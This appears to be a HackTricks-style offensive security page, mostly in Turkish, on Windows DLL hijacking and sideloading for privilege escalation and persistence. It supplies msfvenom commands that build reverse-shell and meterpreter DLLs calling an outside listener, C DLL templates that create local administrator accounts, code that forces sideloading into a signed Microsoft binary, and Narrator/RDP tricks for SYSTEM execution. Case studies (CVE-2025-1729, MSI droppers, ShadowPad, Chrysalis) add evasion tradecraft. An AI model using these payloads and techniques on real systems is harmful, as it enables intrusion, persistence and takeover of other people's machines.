# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Temel Bilgiler

DLL Hijacking, güvenilen bir uygulamanın kötü amaçlı bir DLL yüklemesini sağlamak için uygulamayı manipüle etmeyi içerir. Bu terim **DLL Spoofing, Injection, and Side-Loading** gibi birkaç taktiği kapsar. Genellikle kod yürütme, kalıcılık sağlama ve daha az yaygın olarak privilege escalation için kullanılır. Burada odak escalation olsa da, hijacking yöntemi amaçlar arasında tutarlıdır.

### Yaygın Teknikler

Bir uygulamanın DLL yükleme stratejisine bağlı olarak farklı yöntemler kullanılır; her birinin etkinliği uygulamaya göre değişir:

1. **DLL Replacement**: Gerçek bir DLL'i kötü amaçlı bir DLL ile değiştirmek; istenirse özgün DLL'in işlevselliğini korumak için DLL Proxying kullanılabilir.
2. **DLL Search Order Hijacking**: Kötü amaçlı DLL'i, uygulamanın arama örüntüsünü istismar ederek meşru olanın önünde yer alan bir arama yoluna koymak.
3. **Phantom DLL Hijacking**: Uygulamanın gerekli ama mevcut olmayan bir DLL olduğunu zannederek yüklemesi için kötü amaçlı bir DLL oluşturmak.
4. **DLL Redirection**: Uygulamayı kötü amaçlı DLL'e yönlendirmek için `%PATH%` veya `.exe.manifest` / `.exe.local` gibi arama parametrelerini değiştirmek.
5. **WinSxS DLL Replacement**: WinSxS dizinindeki meşru DLL'i kötü amaçlı bir muadiliyle değiştirmek; genellikle DLL side-loading ile ilişkilendirilen bir yöntemdir.
6. **Relative Path DLL Hijacking**: Kötü amaçlı DLL'i, kopyalanmış uygulamanın bulunduğu ve kullanıcı tarafından kontrol edilen bir dizine yerleştirmek; Binary Proxy Execution tekniklerine benzer.

> [!TIP]
> HTML staging, AES-CTR yapılandırmaları ve .NET implantlarını DLL sideloading üzerine katmanlayan adım adım bir zincir için, aşağıdaki iş akışını inceleyin.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Eksik Dll'leri Bulma

Bir sistem içinde eksik Dll'leri bulmanın en yaygın yolu, sysinternals'tan [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) çalıştırmak ve **aşağıdaki 2 filtreyi** ayarlamaktır:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

ve sadece **File System Activity**'yi gösterin:

![](<../../../images/image (153).png>)

Genel olarak **eksik dll'leri** arıyorsanız, bunu birkaç **saniye** çalışır durumda bırakın.  
Belirli bir yürütülebilir dosya içinde **eksik bir dll** arıyorsanız, **"Process Name" "contains" `<exec name>`** gibi başka bir filtre ayarlayıp uygulamayı çalıştırmalı ve olay yakalamayı durdurmalısınız.

## Exploiting Missing Dlls

Privilege escalation elde etmek için en iyi şansımız, ayrıcalıklı bir işlemin yüklemeye çalışacağı bir dll'i, o dll'in aranacağı yerlerden birine yazabilmektir. Bu nedenle, dll'in orijinalinin bulunduğu klasörden önce aranacağı bir **klasöre** dll yazabiliriz (garip bir durum), ya da dll'in aranacağı bir klasöre yazabiliriz ve orijinal **dll** hiçbir klasörde mevcut olmayabilir.

### Dll Search Order

Dll'lerin nasıl yüklendiğini ayrıntılı olarak görmek için [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching)'a bakın.

**Windows applications**, DLL'leri belirli bir sıraya göre tanımlanmış **arama yolları** izleyerek arar. DLL hijacking sorunu, zararlı bir DLL'in bu dizinlerden birine stratejik olarak yerleştirilmesi ve meşru DLL'den önce yüklenmesini sağlamasıyla ortaya çıkar. Bunu önlemenin bir yolu, uygulamanın ihtiyaç duyduğu DLL'lere başvururken mutlak yollar kullanmasını sağlamaktır.

Aşağıda 32-bit sistemlerdeki **DLL arama sırasını** görebilirsiniz:

1. The directory from which the application loaded.
2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (_C:\Windows\System_)
4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
1. (_C:\Windows_)
5. The current directory.
6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

Bu, **SafeDllSearchMode** etkinkenki **varsayılan** arama sırasıdır. Devre dışı bırakıldığında geçerli dizin ikinci sıraya yükselir. Bu özelliği devre dışı bırakmak için **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** kayıt değerini oluşturup 0 olarak ayarlayın (varsayılan etkin).

Eğer [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) fonksiyonu **LOAD_WITH_ALTERED_SEARCH_PATH** ile çağrılırsa, arama **LoadLibraryEx**'in yüklediği yürütülebilir modülün dizininde başlar.

Son olarak, **bir dll yalnızca ismi yerine mutlak yol belirtilerek yüklenebilir**. Bu durumda o dll **yalnızca belirtilen yolda aranır** (eğer dll'in bağımlılıkları varsa, onlar isimle yüklenecek şekilde aranır).

Arama sırasını değiştirecek başka yollar da vardır fakat bunları burada açıklamayacağım.

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

Yeni oluşturulan bir işlemin DLL arama yolunu deterministik olarak etkilemenin gelişmiş bir yolu, süreci ntdll’in native API'leri ile oluştururken RTL_USER_PROCESS_PARAMETERS içindeki DllPath alanını ayarlamaktır. Buraya saldırgan tarafından kontrol edilen bir dizin sağlanarak, import edilen bir DLL'i isimle çözen (mutlak yol kullanmayan ve güvenli yükleme bayraklarını kullanmayan) hedef süreç, o dizinden kötü amaçlı bir DLL yüklemeye zorlanabilir.

Key idea
- Süreç parametrelerini RtlCreateProcessParametersEx ile oluşturun ve kontrolünüzdeki klasöre işaret eden özel bir DllPath sağlayın (ör. dropper/unpacker'ın bulunduğu dizin).
- Süreci RtlCreateUserProcess ile oluşturun. Hedef ikili bir DLL'i isimle çözdüğünde, loader çözümleme sırasında sağlanan bu DllPath'e bakacak; bu, kötü amaçlı DLL hedef EXE ile aynı yerde olmasa bile güvenilir sideloading yapılmasını sağlar.

Notes/limitations
- Bu, oluşturulan child process'i etkiler; yalnızca mevcut süreci etkileyen SetDllDirectory'den farklıdır.
- Hedef, bir DLL'i isimle import etmeli veya LoadLibrary ile yüklemeli (mutlak yol kullanmamalı ve LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories kullanılmamalı).
- KnownDLLs ve sabitlenmiş mutlak yollar hijack edilemez. Forwarded exports ve SxS önceliği değiştirebilir.

Minimal C example (ntdll, wide strings, simplified error handling):

<details>
<summary>Full C example: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Operasyonel kullanım örneği
- Kötü amaçlı xmllite.dll'yi (gerekli fonksiyonları export eden veya gerçek olanına proxy yapan) DllPath dizininize yerleştirin.
- Yukarıdaki teknikle xmllite.dll'yi isimle aradığı bilinen imzalı bir binary başlatın. Yükleyici importu sağlanan DllPath üzerinden çözer ve DLL'inizi sideloads.

Bu teknik, doğada çok aşamalı sideloading zincirlerini tetiklemek için gözlemlenmiştir: ilk başlatıcı bir yardımcı DLL bırakır, bu DLL daha sonra özel bir DllPath ile saldırganın staging dizininden DLL'ini yüklemeye zorlamak için hijack edilebilen Microsoft-imzalı bir binary spawn eder.

#### Windows dokümanlarından DLL arama sırasına ilişkin istisnalar

Windows dokümantasyonunda standart DLL arama sırasına ilişkin bazı istisnalar belirtilmiştir:

- Bir **adı zaten bellekte yüklü olan DLL ile aynı olan DLL** ile karşılaşıldığında, sistem olağan aramayı atlar. Bunun yerine yönlendirme ve manifest kontrolü yapar ve varsayılan olarak zaten bellekteki DLL'e döner. **Bu senaryoda sistem DLL için bir arama yapmaz**.
- DLL mevcut Windows sürümü için bir **known DLL** olarak tanındığında, sistem known DLL'in kendi sürümünü ve onun herhangi bir bağımlı DLL'ini kullanır, **arama sürecinden vazgeçerek**. Kayıt defteri anahtarı **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** bu known DLL'lerin bir listesini tutar.
- Eğer bir **DLL'in bağımlılıkları** varsa, bu bağımlı DLL'lerin aranması, başlangıçtaki DLL tam yol ile tanımlanmış olsa bile, sanki yalnızca **module names** ile belirtilmişler gibi yapılır.

### Yetki Yükseltme

**Gereksinimler**:

- **Farklı ayrıcalıklar** (yatay veya lateral hareket) ile çalışan veya çalışacak ve **DLL eksikliği olan** bir süreç tespit edin.
- **DLL'in aranacağı** herhangi bir **dizin** için **yazma izni** olduğundan emin olun. Bu konum, yürütülebilir dosyanın dizini veya sistem path'i içindeki bir dizin olabilir.

Evet, gereksinimleri bulmak karmaşıktır çünkü **varsayılan olarak ayrıcalıklı bir yürütülebilirin bir DLL eksik olması biraz garip** ve **bir sistem path klasöründe yazma iznine sahip olmak daha da garip** (varsayılan olarak böyle bir izniniz yoktur). Ancak, yanlış yapılandırılmış ortamlarda bu mümkün olabilir.\
Şanslıysanız ve gereksinimleri karşılıyorsanız, [UACME](https://github.com/hfiref0x/UACME) projesine bakabilirsiniz. Projenin **ana amacı UAC'i bypass etmek** olsa da, orada kullanabileceğiniz Windows sürümü için bir **PoC** ve bir Dll hijaking bulabilirsiniz (muhtemelen yazma izniniz olan klasörün yolunu değiştirmeniz yeterli olacaktır).

Unutmayın, bir klasördeki izinlerinizi **kontrol edebilirsiniz**:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
Ve **PATH içindeki tüm klasörlerin izinlerini kontrol edin**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Ayrıca bir executable'in imports'larını ve bir dll'in exports'larını şu komutla kontrol edebilirsiniz:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Tam kılavuz için, yazma izniniz olan bir **System Path folder** içinde **Dll Hijacking'i kötüye kullanarak ayrıcalıkları yükseltme** hakkında bakın:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Otomatik araçlar

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) system PATH içindeki herhangi bir klasöre yazma izniniz olup olmadığını kontrol edecektir.\
Bu zafiyeti keşfetmek için diğer ilginç otomatik araçlar **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ ve _Write-HijackDll._'dir.

### Örnek

Eğer sömürülebilir bir senaryo bulursanız, bunu başarılı şekilde sömürmek için en önemli şeylerden biri, çalıştırılabilir dosyanın ondan import edeceği en azından tüm fonksiyonları export eden bir dll oluşturmaktır. Her neyse, Dll Hijacking'in [escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) veya [ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system) için kullanışlı olduğunu unutmayın. Bu konuyla ilgili olarak yürütme amaçlı dll hijacking üzerine odaklanan bu çalışma içinde **how to create a valid dll** örneğini bulabilirsiniz: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Ayrıca, bir sonraki bölümde şablon olarak veya gerekli olmayan fonksiyonları export eden bir **dll** oluşturmak için yararlı olabilecek bazı temel dll kodları bulabilirsiniz.

## **Creating and compiling Dlls**

### **Dll Proxifying**

Temelde bir **Dll proxy**, yüklendiğinde kötü amaçlı kodunuzu çalıştırabilen ve aynı zamanda tüm çağrıları gerçek kütüphaneye ileterek beklendiği gibi davranan bir Dll'dir.

With the tool [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) or [**Spartacus**](https://github.com/Accenture/Spartacus) you can actually **indicate an executable and select the library** you want to proxify and **generate a proxified dll** or **indicate the Dll** and **generate a proxified dll**.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Bir meterpreter (x86) al:**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Bir kullanıcı oluştur (x86; x64 sürümünü görmedim):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Kendinize ait

Derlediğiniz Dll'in, victim process tarafından yüklenecek birkaç fonksiyonu **export several functions** olarak dışa aktarması gerektiğini unutmayın; bu fonksiyonlar yoksa **binary won't be able to load** ve **exploit will fail**.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>Kullanıcı oluşturma içeren C++ DLL örneği</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>İş parçacığı giriş noktası olan alternatif C DLL</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Vaka İncelemesi: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe hâlâ başlangıçta öngörülebilir, dile özgü bir yerelleştirme DLL'ini sorgular; bu DLL arbitrary code execution ve persistence için hijack edilebilir.

Key facts
- Probe path (current builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy path (older builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- If a writable attacker-controlled DLL exists at the OneCore path, it is loaded and `DllMain(DLL_PROCESS_ATTACH)` executes. No exports are required.

Discovery with Procmon
- Filter: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Start Narrator and observe the attempted load of the above path.

Minimal DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC silence
- Basit bir hijack, UI'nin konuşmasına veya vurgulanmasına neden olur. Sessiz kalmak için attach olurken Narrator thread'lerini enumerat edin, ana thread'i açın (`OpenThread(THREAD_SUSPEND_RESUME)`) ve `SuspendThread` ile durdurun; kendi thread'inizde devam edin. Tam kod için PoC'ye bakın.

Trigger and persistence via Accessibility configuration
- Kullanıcı bağlamı (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Yukarıdakilerle, Narrator başlatıldığında ekilen DLL yüklenir. Güvenli masaüstünde (oturum açma ekranı), Narrator'ı başlatmak için CTRL+WIN+ENTER tuşlarına basın; DLL'iniz güvenli masaüstünde SYSTEM olarak çalışır.

RDP-triggered SYSTEM execution (lateral movement)
- Klasik RDP güvenlik katmanına izin ver: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Host'a RDP ile bağlanın, oturum açma ekranında Narrator'ı başlatmak için CTRL+WIN+ENTER tuşlarına basın; DLL'iniz güvenli masaüstünde SYSTEM olarak çalışır.
- Çalışma, RDP oturumu kapandığında durur — hemen inject/migrate yapın.

Bring Your Own Accessibility (BYOA)
- Dahili bir Accessibility Tool (AT) kayıt girdisini (ör. CursorIndicator) klonlayabilir, bunu rastgele bir binary/DLL'i işaret edecek şekilde düzenleyip import edebilir ve ardından `configuration` değerini o AT adına ayarlayabilirsiniz. Bu, Erişilebilirlik çerçevesi altında istediğiniz kodun çalıştırılmasına aracılık eder.

Notes
- `%windir%\System32` altına yazmak ve HKLM değerlerini değiştirmek yönetici hakları gerektirir.
- Tüm payload mantığı `DLL_PROCESS_ATTACH` içinde olabilir; export gerekmez.

## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

Bu vaka, Lenovo'nun TrackPoint Quick Menu'sünde (`TPQMAssistant.exe`) görülen **Phantom DLL Hijacking**'i gösterir; izlenen CVE numarası **CVE-2025-1729**.

### Vulnerability Details

- **Component**: `TPQMAssistant.exe` located at `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` her gün 09:30'da oturum açmış kullanıcı bağlamında çalışır.
- **Directory Permissions**: `CREATOR OWNER` tarafından yazılabilir, yerel kullanıcıların rastgele dosyalar bırakmasına izin verir.
- **DLL Search Behavior**: Önce çalışma dizininden `hostfxr.dll` yüklemeye çalışır ve eksikse "NAME NOT FOUND" kaydeder; bu, yerel dizin arama önceliğini işaret eder.

### Exploit Implementation

Bir saldırgan aynı dizine kötü amaçlı bir `hostfxr.dll` stub'u yerleştirerek eksik DLL'i suistimal edebilir ve kullanıcının bağlamında kod çalıştırma elde edebilir:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Saldırı Akışı

1. Standart bir kullanıcı olarak `hostfxr.dll` dosyasını `C:\ProgramData\Lenovo\TPQM\Assistant\` dizinine bırakın.
2. Mevcut kullanıcının bağlamında zamanlanmış görevin sabah 9:30'da çalışmasını bekleyin.
3. Görev çalıştığında bir yönetici oturum açmışsa, kötü amaçlı DLL yönetici oturumunda medium integrity ile çalışır.
4. Standart UAC bypass tekniklerini zincirleyerek medium integrity'den SYSTEM ayrıcalıklarına yükseltin.

## Vaka İncelemesi: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Tehdit aktörleri sıklıkla MSI tabanlı droppers ile DLL side-loading'i eşleştirir ve payload'ları güvenilir, imzalı bir süreç altında çalıştırır.

Chain overview
- Kullanıcı MSI indirir. GUI yükleme sırasında (ör. LaunchApplication veya bir VBScript action) CustomAction sessizce çalışır ve sonraki aşamayı gömülü kaynaklardan yeniden oluşturur.
- Dropper, aynı dizine meşru, imzalı bir EXE ve kötü amaçlı bir DLL yazar (örnek çift: Avast-imzalı wsc_proxy.exe + saldırgan-kontrollü wsc.dll).
- İmzalı EXE başlatıldığında, Windows DLL search order çalışma dizininden önce wsc.dll'i yükler ve imzalı bir ebeveyn altında saldırgan kodunun çalışmasına neden olur (ATT&CK T1574.001).

MSI analysis (what to look for)
- CustomAction table:
- Yürütülebilir dosyaları veya VBScript'i çalıştıran girdilere bakın. Örnek şüpheli desen: LaunchApplication'ın arka planda gömülü bir dosyayı çalıştırması.
- Orca'da (Microsoft Orca.exe), CustomAction, InstallExecuteSequence ve Binary tablolarını inceleyin.
- MSI CAB içindeki gömülü/bölünmüş payload'lar:
- Yönetici çıkarımı: msiexec /a package.msi /qb TARGETDIR=C:\out
- Ya da lessmsi kullanın: lessmsi x package.msi C:\out
- Bir VBScript CustomAction tarafından birleştirilen ve şifresi çözülen birden fazla küçük parça arayın. Yaygın akış:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
wsc_proxy.exe ile pratik sideloading
- Bu iki dosyayı aynı klasöre bırakın:
- wsc_proxy.exe: meşru, imzalı host (Avast). Process kendi dizininden wsc.dll'i isimle yüklemeye çalışır.
- wsc.dll: attacker DLL. Eğer belirli exports gerekmezse, DllMain yeterli olabilir; aksi takdirde bir proxy DLL oluşturun ve gerekli exports'ları gerçek kütüphaneye forward ederken DllMain içinde payload'u çalıştırın.
- Minimal bir DLL payload oluşturun:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Export gereksinimleri için, ayrıca payload'unuzu da çalıştıran bir forwarding DLL oluşturmak üzere proxying framework (ör. DLLirant/Spartacus) kullanın.

- Bu teknik host binary'nin DLL name resolution'ına dayanır. Eğer host absolute paths veya safe loading flags (ör. LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories) kullanıyorsa, hijack başarısız olabilir.
- KnownDLLs, SxS ve forwarded exports önceliği etkileyebilir ve host binary ile export seti seçilirken dikkate alınmalıdır.

## Signed triads + encrypted payloads (ShadowPad vaka incelemesi)

Check Point, Ink Dragon'ın ShadowPad'i disk üzerinde çekirdek payload'u şifreli tutarken meşru yazılımlarla karışmak için nasıl **three-file triad** kullandığını açıkladı:

1. **Signed host EXE** – AMD, Realtek veya NVIDIA gibi satıcılar suistimal edilir (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Saldırganlar yürütülebilir dosyayı bir Windows binary gibi görünmesi için yeniden adlandırır (ör. `conhost.exe`), ancak Authenticode imzası geçerli kalır.
2. **Malicious loader DLL** – EXE'nin yanına beklenen bir isimle bırakılır (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). DLL genellikle ScatterBrain framework ile obfuscate edilmiş bir MFC binary'dir; tek görevi encrypted blob'u bulmak, decrypt etmek ve ShadowPad'i reflectively map etmektir.
3. **Encrypted payload blob** – genellikle aynı dizinde `<name>.tmp` olarak saklanır. Decrypted payload belleğe memory-map edildikten sonra loader TMP dosyasını adli delilleri yok etmek için siler.

Tradecraft notes:

* Signed EXE'yi yeniden adlandırmak (PE başlığındaki orijinal `OriginalFileName`'ı koruyarak) onu bir Windows binary'si gibi gösterirken vendor signature'ı korumasını sağlar; bu yüzden Ink Dragon'ın gerçekten AMD/NVIDIA utility olan `conhost.exe` görünümlü binary'leri bırakma alışkanlığını taklit edin.
* Executable güvendiği için çoğu allowlisting kontrolü genellikle malicious DLL'in yanında durmasını yeterli bulur. Loader DLL'i özelleştirmeye odaklanın; signed parent genellikle değiştirilmeden çalıştırılabilir.
* ShadowPad'ın decryptor'u TMP blob'un loader'ın yanında ve yazılabilir olmasını bekler ki map işleminden sonra dosyayı sıfırlayabilsin. Payload yüklenene kadar dizini yazılabilir tutun; bir kez bellekteyken TMP dosyası OPSEC için güvenle silinebilir.

## Vaka İncelemesi: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

Son zamanlarda bir Lotus Blossom ihlali, güvenilen bir update zincirini suistimal ederek NSIS-pack edilmiş bir dropper teslim etti; bu, bir DLL sideload ve tamamen in-memory payload'ları sahneledi.

Tradecraft flow
- `update.exe` (NSIS) `%AppData%\Bluetooth` oluşturur, bunu **HIDDEN** yapar, yeniden adlandırılmış Bitdefender Submission Wizard `BluetoothService.exe`'yi, malicious `log.dll`'yi ve encrypted blob `BluetoothService`'ı bırakır, sonra EXE'yi başlatır.
- Host EXE `log.dll`'yi import eder ve `LogInit`/`LogWrite`'ı çağırır. `LogInit` blob'u mmap-load eder; `LogWrite` onu custom LCG-based stream ile decrypt eder (constants **0x19660D** / **0x3C6EF35F**, key material önceki bir hash'ten türetilir), buffer'ı plaintext shellcode ile overwrite eder, temps'i free eder ve oraya atlar.
- IAT'ten kaçınmak için loader, export isimlerini hash'leyerek API'leri çözer: **FNV-1a basis 0x811C9DC5 + prime 0x1000193**, ardından Murmur-style avalanche (**0x85EBCA6B**) uygular ve salted target hash'lerle karşılaştırır.

Main shellcode (Chrysalis)
- PE-benzeri ana modülü beş geçişli add/XOR/sub tekrarlarıyla key `gQ2JR&9;` kullanarak decrypt eder, sonra import çözümlemesini bitirmek için dinamik olarak `Kernel32.dll` → `GetProcAddress` yükler.
- DLL isim stringlerini runtime'da karakter başına bit-rotate/XOR transformlarıyla yeniden inşa eder, sonra `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32` yükler.
- İkinci bir resolver kullanır; bu resolver **PEB → InMemoryOrderModuleList**'i gezer, her export tablosunu 4-bayt bloklar halinde Murmur-style mixing ile parse eder ve hash bulunamazsa ancak o zaman `GetProcAddress`'e geri döner.

Embedded configuration & C2
- Config, bırakılan `BluetoothService` dosyasının içinde **offset 0x30808**'de (boyut **0x980**) yer alır ve RC4 ile key `qwhvb^435h&*7` kullanılarak decrypt edilir; C2 URL ve User-Agent açığa çıkar.
